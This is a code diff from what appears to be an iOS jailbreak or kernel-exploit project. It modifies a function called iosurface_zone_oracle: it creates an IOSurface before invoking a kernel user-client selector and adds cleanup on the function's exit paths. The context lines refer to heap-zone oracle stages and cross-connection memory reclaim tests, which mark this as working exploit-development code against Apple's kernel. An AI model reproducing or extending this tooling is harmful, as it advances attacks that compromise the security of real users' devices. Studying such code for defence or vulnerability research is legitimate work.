@@ -41962,6 +41962,28 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
 
         log([NSString stringWithFormat:@"JB56: conn=%u svc_ok=YES open_kr=0x%x", conn, kr]);
 
+        // Create IOSurface BEFORE sel17 — required for register to succeed
+        typedef void*(*iosurface_create_fn)(void*);
+        typedef uint32_t(*iosurface_getid_fn)(void*);
+        iosurface_create_fn sym_surf_create = (iosurface_create_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        iosurface_getid_fn sym_surf_getid = (iosurface_getid_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+
+        void *surface = NULL;
+        uint32_t surfID = 0;
+        if (sym_surf_create && sym_surf_getid) {
+            NSDictionary *propsDict = @{
+                @"IOSurfaceWidth": @(256),
+                @"IOSurfaceHeight": @(256),
+                @"IOSurfaceBytesPerElement": @(4),
+                @"IOSurfaceAllocSize": @(262144)
+            };
+            surface = sym_surf_create((__bridge void*)propsDict);
+            surfID = surface ? sym_surf_getid(surface) : 0;
+            log([NSString stringWithFormat:@"JB56: IOSurface created surfID=%u ptr=%p", surfID, surface]);
+        } else {
+            log(@"JB56: WARNING — IOSurfaceCreate not found, sel17 may fail");
+        }
+
         // Use jb41 helpers (proven working pattern)
         unsigned int wp = jb41_newWakePort();
         uint64_t ref = 0x1122334455667788ULL;
@@ -42000,6 +42022,7 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
         if (t1_hits == 0 && !isr_stopped()) {
             log(@"JB56: T1 oracle not working, skipping remaining stages");
             results[@"verdict"] = @"NO_ORACLE";
+            if (surface) CFRelease(surface);
             sym_close(conn);
             jb41_dropPort(wp);
             done(results);
@@ -42289,6 +42312,7 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
         results[@"t8_reclaimed"] = @(t8_reclaimed);
         log([NSString stringWithFormat:@"JB56: T8 cross-conn reclaimed=%d/5", t8_reclaimed]);
 
+        if (surface) CFRelease(surface);
         sym_close(conn);
         jb41_dropPort(wp);
 
